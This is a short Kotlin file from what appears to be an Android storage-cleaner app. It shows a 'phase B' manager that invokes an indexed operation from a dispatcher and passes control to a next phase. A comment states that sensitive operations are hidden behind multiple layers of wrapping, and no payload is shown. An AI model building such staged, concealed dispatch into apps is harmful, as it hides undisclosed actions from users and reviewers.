package com.mobile.storage.clean.go.dc

import android.app.Application
import com.mobile.storage.clean.tool.InFTool

// 第二阶段管理器
internal object PhaseBManager {
    
    fun proceed(ctx: Application) {
        InFTool.lifStart(ctx)
        
        // 敏感操作通过多层包装隐藏
        val ops = OperationDispatcher.createOperations(ctx)
        ops[0x1A]?.invoke()
        
        // 继续流程
        PhaseCHandler.execute(ctx)
    }
}
